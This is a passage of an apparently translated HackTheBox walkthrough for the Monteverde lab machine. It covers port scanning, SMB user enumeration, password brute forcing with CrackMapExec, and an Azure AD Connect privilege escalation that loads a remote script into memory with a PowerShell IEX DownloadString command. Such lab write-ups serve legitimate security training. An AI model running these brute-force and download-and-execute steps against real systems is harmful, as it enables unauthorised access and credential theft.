HackTheBox. Walkthrough Monteverde. Brute SMB and LPE through Azure Admins


I continue to publish solutions sent for further processing from the HackTheBox site .

In this article, we brute-force the SMB password and increase the privileges to an administrator on behalf of a member of the Azure Admins group.

Connection to the laboratory is via VPN. It is recommended not to connect from a work computer or from a host where the data important to you is available, since you end up on a private network with people who know something in the field of information security :)

Recon


This machine has an IP address 10.10.10.172, which I add to / etc / hosts.

10.10.10.172    monteverde.htb

First, we scan open ports. Since it takes a long time to scan all the ports with nmap, I will first do this with masscan. We scan all TCP and UDP ports from the tun0 interface at a speed of 500 packets per second.

masscan -e tun0 -p1-65535,U:1-65535 10.10.10.172   --rate=500



The host has many ports open. Now scan them with nmap to filter and select the ones you need.

nmap monteverde.htb -p49778,88,593,49667,53,445,5985,49675,9389,3268,49706,389,464,49674,139,636,135,3269,49673



Now, for more detailed information about the services that operate on ports, we will run a scan with the -A option.

nmap -A monteverde.htb -p88,593,53,445,5985,9389,3268,389,464,139,636,135,3269



First, check SMB. We do this with enum4linux. So we get users, as well as their membership in the group.

enum4linux -a monteverde.htb





USER


As usual, while we are looking for an entry point, at the same time brute force passwords. Since the password policy sets the minimum number of characters in the password - 7, we will make the following lists.





Now run the brute using CrackMapExec.

cme smb monteverde.htb -u ./users.txt -p ./passwords.txt



And surprisingly, it was a success - we found the user credentials. Let's see the resources available to the user.

cme smb monteverde.htb -u SABatchJobs -p SABatchJobs --shares



And turn to the users $ resource.

smbclient -U SABatchJobs%SABatchJobs //10.10.10.172/users$

He is a member of the Azure Admins group - this is an LPE vector. We use Azure-ADConnect to connect to the Azure database. We load the script from the local server into memory on the remote machine and execute it.

IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.60/Azure-ADConnect.ps1')
Azure-ADConnect -server 127.0.0.1 -db ADSync
